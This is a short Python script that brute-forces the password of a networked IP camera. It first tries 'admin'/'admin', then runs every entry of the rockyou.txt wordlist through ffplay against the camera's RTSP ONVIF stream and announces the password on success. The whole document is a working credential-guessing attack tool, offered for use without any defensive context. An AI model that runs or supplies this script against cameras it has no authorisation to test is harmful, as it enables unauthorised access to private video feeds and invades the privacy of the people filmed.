import subprocess

username = 'admin'
password = 'admin'
ip_addr = input("Insert ip Address: ") #'192.168.188.77'

res = subprocess.Popen(['ffplay',f'rtsp://{username}:{password}@{ip_addr}:554/onvif1'],stdout=subprocess.PIPE,stderr=subprocess.PIPE);
output, error = res.communicate() 

if b"400 Bad Request" in error:
    print("Something Went Wrong, Trying Next Password...\n")
    res.kill()    
else:
    print(f"Nice Job, the password was {password}")

# Number of lines in the WordList file (in this case, rockyou.txt).
lines = 14344393 

# You can always edit 'rockyou.txt' with onother WordList.
with open('rockyou.txt') as topo_file:    
    for iteration, line in enumerate(topo_file):
        password, progress = line[:-1], "{0:.5f}%".format(iteration/lines*100)
        print(line, f'{progress} / 100%')
        res = subprocess.Popen(['ffplay',f'rtsp://{username}:{password}@{ip_addr}:554/onvif1'],stdout=subprocess.PIPE,stderr=subprocess.PIPE);
        output, error = res.communicate()
        if b"400 Bad Request" in error:
            print("Something Went Wrong, Trying Next Password...\n")
            res.kill()    
        else:
            print(f"Nice Job, the password was {password}")
            break
    else:
        print("\nOperation Compleated")
